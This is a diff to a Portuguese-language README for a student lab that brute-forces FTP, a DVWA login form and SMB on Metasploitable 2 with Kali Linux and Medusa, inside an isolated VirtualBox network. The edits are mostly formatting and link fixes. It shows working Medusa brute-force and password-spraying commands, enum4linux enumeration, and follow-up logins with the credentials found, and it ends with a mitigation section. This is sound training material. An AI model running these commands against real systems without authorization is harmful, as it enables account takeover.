@@ -5,7 +5,7 @@ Um projeto de testes de força bruta utilizando Kali Linux e Medusa contra Metas
 <br>
 
 ##  <img src="https://img.icons8.com/?size=100&id=92oZwSFODREJ&format=png&color=000000" width="30"/> Ferramentas | Tecnologias
-• [VirtualBox](https://www.oracle.com/br/virtualization/virtualbox/) com rede interna (host-only)  
+• [VirtualBox](https://www.oracle.com/br/virtualization/virtualbox/)  
 • [Kali Linux](https://www.kali.org)  
 • [DVWA](https://www.dvwa.co.uk)  
 • [Medusa](http://foofus.net/goons/jmk/medusa/medusa.html)  
@@ -14,17 +14,17 @@ Um projeto de testes de força bruta utilizando Kali Linux e Medusa contra Metas
 <br>
 
 ##  <img src="https://img.icons8.com/?size=100&id=yggUP2AbmFLz&format=png&color=000000" width="30"/> Ambiente
-• VirtualBox — rede isolada (Host-only)  
-• DVWA — aplicação web propositalmente vulnerável  
-• Kali Linux em VM — atacante  
-• Metasploitable 2 — alvo  
+• VirtualBox — com rede interna isolada (host-only)  
+• DVWA — setada aplicação web propositalmente vulnerável  
+• Kali Linux em VM — máquina atacante  
+• Metasploitable 2 — máquina alvo  
 <br>
 
 ## <img src="https://img.icons8.com/?size=100&id=deeE9DHeelmc&format=png&color=000000" width="30"/> Arquivos (Wordlists)  
 Para realização dos testes de força bruta foram criados dois arquivos simples contendo combinações comuns de usuários e senhas:
 
-• [```users.txt```](src="https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/users.txt"'>): Este arquivo contém uma lista de usuários (wordlist) personalizados para o ataque nos serviços vulneráveis    
-• [```pass.txt```](src="https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/pass.txt"'>): Este arquivo contém uma lista de senhas  (wordlist) personalizados para o ataque nas tentativas de autenticação
+• [```users.txt```](https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/users.txt): Este arquivo contém uma lista de usuários (wordlist) personalizados para o ataque nos serviços vulneráveis    
+• [```pass.txt```](https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/pass.txt): Este arquivo contém uma lista de senhas  (wordlist) personalizados para o ataque nas tentativas de autenticação
 
 • Criação dos arquivos de usuários e senhas:  
 
@@ -36,7 +36,7 @@ Para realização dos testes de força bruta foram criados dois arquivos simples
 <br>
 
 ● **FTP** — força bruta  
-Objetivo: Testar credenciais  
+Objetivo: testar credenciais  
 <pre><code>medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 4</code></pre>
 
 ▶ Validação (com as credenciais encontradas):  
@@ -47,7 +47,7 @@ lftp -u usuario,senha 192.168.56.10</code></pre>
 <br>
 
 ● **Ataque ao Formulário Web** (DVWA) — brute force no formulário  
-Objetivo: Testar credenciais contra o login da DVWA  
+Objetivo: testar credenciais contra o login da DVWA  
 <pre><code>medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
 -m PAGE:/dvwa/login.php \
 -m "FORM:username=^USER^&password=^PASS^&Login=Login" \
@@ -55,9 +55,10 @@ Objetivo: Testar credenciais contra o login da DVWA
 
 ▶ Validação: acessar o endereço http://192.168.56.101/dvwa/login.php e testar as credenciais encontradas
 <br>
+<br>
 
 ● **Ataque ao Serviço SMB** — password spraying    
-Objetivo: Quebrar autenticação SMB no Metasploitable2
+Objetivo: quebrar autenticação SMB no Metasploitable2
 <pre><code>medusa -h 192.168.56.101 -U users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50</code></pre>  
 
 ▶ Validação:
@@ -66,7 +67,9 @@ ou
 smbclient //192.168.56.101/share -U usuario%senha</code></pre>
 <br>
 
-▶ Enumeração (SMB)
+
+▶ Enumeração (SMB)  
+Objetivo: enumerar informações de máquinas através dos serviços SMB  
 <pre><code>enum4linux -a 192.168.56.101</code></pre>  
 <br>
 
@@ -76,14 +79,21 @@ smbclient //192.168.56.101/share -U usuario%senha</code></pre>
 ● DVWA: credencial encontrada via Medusa e validada comparando a string de falha; login confirmado no browser  
 ● SMB: password spraying comprovou senha fraca para usuário enumerado; acesso testado com smbclient  
 
-▶ Log de Enumeração <img src="https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/enum4linux_log">
+▶ [Log de Enumeração](https://github.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/blob/main/assets/enum4linux_log.txt)
 <br>
-▶ FORM <img src="https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/img/form.png" width='50%'>
+
+▶ FORM  
+<img src="https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/img/form.png" width='50%'>
 <br>
-▶ SMB <img src="https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/img/smb.png" width='50%'>
+
+▶ SMB  
+<img src="https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/img/smb.png" width='50%'>
 <br>
-▶ SMB-SUCCESS<img src="https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/img/smb-success" width='50%'>
+
+▶ SMB-SUCCESS  
+<img src="https://raw.githubusercontent.com/j0hn-Macl4n3/dio.desafio.simulando.ataque.bruteforcedesenhas.medusa-kali/main/assets/img/smb-success.png" width='50%'>
 <br>
+
 
 ## <img src="https://img.icons8.com/?size=100&id=6cRQkz9fQQD2&format=png&color=000000" width="30"/> Recomendações de Mitigação  
 Tendo como base as vulnerabilidades exploradas, as seguintes contramedidas são essenciais para o fortalecimento da segurança:  
